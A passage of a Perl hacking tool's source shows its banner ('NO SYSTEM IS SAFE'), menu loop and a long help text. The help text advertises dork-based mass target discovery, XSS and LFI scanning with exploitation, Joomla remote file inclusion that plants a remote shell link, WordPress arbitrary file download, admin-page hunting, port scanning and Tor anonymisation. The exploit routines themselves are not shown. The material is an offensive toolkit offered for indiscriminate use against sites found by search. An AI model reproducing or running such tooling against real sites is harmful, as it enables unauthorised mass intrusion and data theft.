     [+]================================================================[+]
     [+]======================    DISCLAIMER !!!  ======================[+]
     [+]  We will not be responsible or liable, directly or indirectly  [+]
     [+]  in any way for any loss or damage of any kind incurred as     [+]
     [+]                  a result of use of our material !!            [+]
     [+]================================================================[+]
     [+]                      NO SYSTEM IS SAFE !!!                     [+]
     [+]       If you like my tool you must know that i never           [+]
     [+]                      studied scripting!                        [+]
     [+]                NO Monopoly for the Knowledge!                  [+]
     [+]================================================================[+]
    \n";
  print color 'magenta', RESET;

  after1:;
  print color 'yellow';
  print "    [+] Now You Want To Back To Menu (1) Or Exit (0) ? ";
  print color RESET;
  $after1=<STDIN>;
  chomp ($after1);
  if ($after1==1) {
    goto TASKS;
  }
  if ($after1==0) {
    print color 'red';
    print "    [!] Have A Good Time! Bye.\n";
    print color RESET;
    exit;
  }
  if ($after1 != 0 or 1) {
	print color 'red';
    print "    [!] Upsss.. Invalid Option!\n";
	print color RESET;
    sleep(1);
    goto after1;
  }
}
#######################################################################
#######################################################################
#Help
if($task eq "7"){
  sub help {
    print color 'bold yellow';
    print "    [..] SIMPLE USE: \n\n";
    print color RESET;
    print color 'bold';
    print "       SEARCH ENGINE (BING) \n";
    print color RESET;
    print "        - Simple Usage : perl ./ ",basename($0),"  \n";
    print "        - Command line Usage : perl ./",basename($0)," <option> \n";
    print color 'bold';
    print "       SEARCH ENGINE (BING) \n";
    print color RESET;
    print "        - Search Engine \n";
    print color 'bold';
    print "       SITE SCANNER \n";
    print color RESET;
    print "        - Check Httpd Version \n";
    print "        - Xss Scan / Sqlmap / Xss + Exploit + Validation \n";
    print "        - Lfi Scan / Exploit + Validation \n";
    print "        - Rfi Scan (Joomla) \n";
    print "        - Rfi Scan (Wordpress) \n";
    print "        - Xss + Lfi \n";
    print "        - Find Admin Page \n";
    print color 'bold';
    print "       SERVER SCANNER \n";
    print color RESET;
    print "        - Ports Scan \n";
    print "        - Get Server Wordpress Sites \n";
    print "        - Get Server Joomla Sites \n";
    print "        - Get Upload Files \n";
    print "        - Get Zip Files \n";
    print color 'bold';
    print "       MD5 / BASE 64 \n";
    print color RESET;
    print "        - MD5 Generator \n";
    print "        - Encode Base64 \n";
    print "        - Decode Base64 \n";
    print color 'bold';
    print "       TERMINAL \n";
    print color RESET;
    print "        - Execute commands \n\n";
    print color 'bold yellow';
    print "    [..] COMMANDLINE USE: \n\n";
    print color RESET;
    print "       --tor:      | tor proxy [DEFAULT:socks://localhost:9050] Change if needed!\n";
    print "       --help:     | help menu \n";
    print "       -s:         | dork to search [Ex: house,cars,hotel] \n";
    print "       --mp:       | number of page results \n";
    print "       --xss:      | xss scan \n";
    print "       -t:         | target \n";
    print "       -l:         | list \n";
    print "       --valid:    | text for validate results \n";
    print "       --exp:      | exploit";
    print "       --sqlmap:   | sqlmaping xss results \n";
    print "       --sqlmaptor:| sqlmaping xss results using tor proxy\n";
    print "       --lfi:      | local file inclusion \n";
    print "       --joomrfi:  | get joomla sites with rfi in the server \n";
    print "       --shell:    | shell link [Ex: http://www.site.com/shell.txt] \n";
    print "       --wpadf:    | get wordpress sites with arbitery file download in the server\n";
    print "       --admin:    | get site admin page \n";
    print "       --shost:    | get site subdomains \n";
    print "       --ports:    | scan server ports \n";
    print "       --start:    | start scan port \n";
    print "       --end:      | end scan port \n";
    print "       --tcp:      | tcp ports \n";
    print "       --udp:      | udp ports \n";
    print "       --all:      | complete mode \n";
    print "       --basic:    | basic mode \n";
    print "       --sites:    | sites in the server \n";
    print "       --wp:       | wordpress sites in the server\n";
    print "       --joom:     | joomla sites in the server\n";
    print "       --upload:   | get sites with upload files in the server  \n";
    print "       --zip:      | get sites with zip files in the server \n";
    print "       --st:       | string \n";
    print "       --md5:      | convert to md5 \n";
    print "       --encode64: | encode base64 string \n";
    print "       --decode64: | decode base64 string \n";
    print "       --isup:     | check http status 200. \n";
    print "       --httpd:    | print site httpd version \n\n";
    print color 'bold yellow';
    print "    [..] EXAMPLES: \n\n";
    print color RESET;
    print color 'bold';
	print "       Tor: \n";
    print color RESET;
    print "       --tor \n";
    print color 'bold';
	print "       Search engine: \n";
    print color RESET;
    print "       Simple search: [-s <dork> --mp <number of page results to scan>] \n";
    print "                      [-s <dork1,dork2,dork3> --mp <number of page results to scan>] \n";
    print "                      [-s <dorks.txt> --mp <number of page results to scan>] \n";
    print color 'bold';
	print "       Subscan from Serach Engine: \n";
    print color RESET;
    print "       Xss: -s <dork/dork.txt> --mp <1> --xss \n";
    print "       Lfi: -s <dork/dork.txt> --mp <1> --lfi \n";
	print "       Search + Command: -s <dork/dork.txt> --mp <value> --command 'curl -v' --TARGET \n";
    print color 'bold';
	print "       Validation: \n";
    print color RESET;
    print "       Xss: -s <dork/dork.txt> --mp <1> --xss --valid <txt>\n";
    print "       Lfi: -s <dork/dork.txt> --mp <1> --lfi --valid <txt> \n";
    print "       Xss: -s <dork/dork.txt> --mp <1> --xss --isup\n";
    print "       Lfi: -s <dork/dork.txt> --mp <1> --lfi --isup \n";
    print color 'bold';
	print "       Use List / Target: \n";
    print color RESET;
    print "       Xss: -t <target> --xss\n";
    print "       Lfi: -l <target> --lfi \n";
    print "       Xss + Validation: -t <target> --xss --valid <txt>\n";
    print "       Lfi + Validation: -t <target> --lfi --valid <txt> \n";
    print "       Xss + Validation: -l <list.txt> --xss --isup\n";
    print "       Lfi + Validation: -l <list.txt> --lfi --isup \n";
    print "       Find admin page: -t <target> --admin\n";
    print "       Find subdomains: -t <target> --shost\n";
    print color 'bold';
	print "       Server: \n";
    print color RESET;
    print "       Get Server sites: -t <ip> --mp <value> --sites\n";
    print "       Get Server wordpress sites: -t <ip> --mp <value> --wp \n";
    print "       Get Server joomla sites: -t <ip> --mp <value> --joom \n";
    print "       Get Server upload sites: -t <ip> --mp <value> --upload \n";
    print "       Get Server zip sites files: -t <ip> --mp <value> --zip \n";
    print "       WP Arbitry File Download: -t <ip> --mp <value> --wpadf \n";
    print "       Joomla RFI: -t <ip> --mp <1> --joomfri --shell <shell link>\n";
    print "       Scan basic tcp (quick): -t <ip> --ports --basic --tcp\n";
    print "       Scan basic udp basic (quick): -t <ip> --ports --basic --udp\n";
    print "       Scan basic udp+tcp: -t <ip> --ports --basic --udp --tcp\n";
    print "       Scan complete tcp: -t <ip> --ports --all --tcp\n";
    print "       Scan complete udp: -t <ip> --ports --all --udp\n";
    print "       Scan complete tcp+udp: -t <ip> --ports --all --udp --tcp\n";
    print "       Scan rang tcp: -t <ip> --ports --start --end --tcp\n";
    print "       Scan rang udp: -t <ip> --ports --start --end --udp\n";
    print "       Scan rang udp + tcp: -t <ip> --ports --start <value> --end <value> --udp --tcp\n";
    print color 'bold';
	print "       Encode / Decode: \n";
    print color RESET;
    print "       Generate MD5: -st <string> --md5 \n";
    print "       Encode base64: -st <string> --encode64 \n";
    print "       Decode base64: -st <string> --decode64 \n";
  }
  help();
  after100:;
  print color 'yellow';
  print "    [+] Now You Want To Back To Menu (1) Or Exit (0) ? ";
  print color RESET;
  $after100=<STDIN>;
  chomp ($after100);
  if ($after100==1) {
      goto TASKS;
  }
  if ($after100==0) {
    print color 'red';
    print "    [!] Have A Good Time! Bye.\n";
    print color RESET;
    exit;
  }
  if ($after100 != 0 or 1) {
	print color 'red';
    print "    [!] Upsss.. Invalid Option!\n";
	print color RESET;
    sleep(1);
    goto after100;
  }
}
#######################################################################
#######################################################################
#Exit
if($task eq "8"){
  print color 'red';
  print "[..][!] Have A Good Time! Bye.\n";
  print color RESET;
  exit;
}

#######################################################################
#######################################################################
####END TASKS
if ($TASKS != 1 or 2 or 3 or 4 or 5 or 6 or 7 or 8) {
  print color 'red';
  print "    [!] Upsss.. Invalid Option!\n";
  print color RESET;
  sleep(1);
  goto TASKS;
}
#######################################################################
